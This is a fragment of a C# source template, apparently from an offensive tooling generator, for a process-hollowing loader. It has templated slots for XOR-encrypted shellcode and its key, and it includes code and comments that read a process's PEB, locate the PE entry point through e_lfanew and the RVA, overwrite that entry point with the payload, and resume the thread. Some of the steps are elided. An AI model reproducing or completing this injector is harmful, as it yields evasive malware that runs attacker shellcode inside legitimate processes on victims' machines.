...
namespace ProcessHollowing
{
    public class Program
    {
        ...
        public static void Main(string[] args)
        {
            ...
            // XOR-encrypted shellcode (key: 0x{{ xor_key }})
{{ csharp_payload | indent(12) }}
            ...
            // From the PEB, we have to:
            // 1. Read executable address from first 8 bytes of PEB
            ...
            // 2. Read the field 'e_lfanew', 4 bytes at offset 0x3C to get PE header offset
            uint e_lfanew = BitConverter.ToUInt32(dataBuf, 0x3c);
            Console.WriteLine($"DEBUG: e_lfanew offset: {"0x" + e_lfanew.ToString("x")}.");

            // 3. Add offset of 0x28 to get Entrypoint RVA offset
            uint rvaOffset = e_lfanew + 0x28;
            Console.WriteLine($"DEBUG: RVA offset: {"0x" + rvaOffset.ToString("x")}.");

            // 4. Read the RVA to get entrypoint offset from executable base
            uint rva = BitConverter.ToUInt32(dataBuf, (int)rvaOffset);
            Console.WriteLine($"DEBUG: RVA value: {"0x" + rva.ToString("x")}.");

            // 5. Get absolute entrypoint address
            ...
            // Overwrite entrypoint with our payload
            ...
            // Resume thread to trigger payload
